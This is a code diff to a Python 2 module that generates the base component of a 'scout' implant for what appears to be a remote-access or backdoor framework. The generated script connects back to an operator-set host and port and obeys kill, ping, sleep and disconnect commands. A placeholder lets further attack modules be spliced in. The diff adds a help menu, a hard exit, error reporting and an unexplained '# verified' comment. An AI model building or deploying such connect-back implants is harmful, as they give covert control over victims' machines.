@@ -1,6 +1,8 @@
+# verified
 import library.modules.config as config
 
 config.main()
+
 
 def main(option):
     if option == 'generate':
@@ -10,8 +12,9 @@ def main(option):
         timeout = config.scout_values['Timeout'][0]
         filepath = config.scout_values['Path'][0]
         config.import_statements.append('import socket')
+        config.import_statements.append('from os import _exit')
         config.import_statements.append('from time import sleep')
-        f = open(filepath,'w')
+        f = open(filepath, 'w')
         f.write('''
 def recv_all(sock):
     sock.settimeout(None)
@@ -25,6 +28,7 @@ def recv_all(sock):
             data += tmp_data
         except (socket.error, socket.timeout):
             return data
+
 while True:
     while True:
         try:
@@ -36,12 +40,14 @@ while True:
         except (socket.timeout,socket.error):
             continue
     while True:
-        try:    
+        try:
             data = recv_all(s)
             command = data.split(' ',1)[0]
             if command == 'kill':
                 s.sendall('[*]Scout is killing itself...')
-                quit()
+                _exit(1)
+            elif command in ('help','?'):
+                s.sendall(help_menu)
             elif command == 'ping':
                 s.sendall('[+]Scout is alive')
             elif command == 'sleep':
@@ -53,19 +59,22 @@ while True:
             elif command == 'disconnect':
                 s.sendall('[*]Scout is disconnecting itself...')
                 sleep(3)
-                break
+                break#Statements#
             else:
-                s.sendall('[-]Please enter a valid command')
+                s.sendall('[-]Scout does not have the capability to run this command. (Was it loaded during generation?)')
         except (socket.error,socket.timeout):
             s.close()
             break
         except IndexError:
-            s.sendall('[-]Please supply valid arguments')
-'''.replace('variable_timeout',timeout).replace('variable_host',host).replace('variable_port',port).replace('variable_key',key))
+            s.sendall('[-]Please supply valid arguments for the command you are running')
+        except Exception as e:
+            s.sendall('[!]Error in scout : ' + str(e))
+'''.replace('variable_timeout', timeout).replace('variable_host', host).replace('variable_port', port).replace(
+            'variable_key', key))
         f.close()
     elif option == 'info':
         print '\nName             : Base component' \
               '\nOS               : Linux' \
               '\nRequired Modules : socket, time' \
-              '\nCommands         : kill,ping,sleep,disconnect' \
+              '\nCommands         : kill, ping, sleep <time>, disconnect' \
               '\nDescription      : The base component of the scout, it allows it to connect back to the server and supports connection status commands\n'
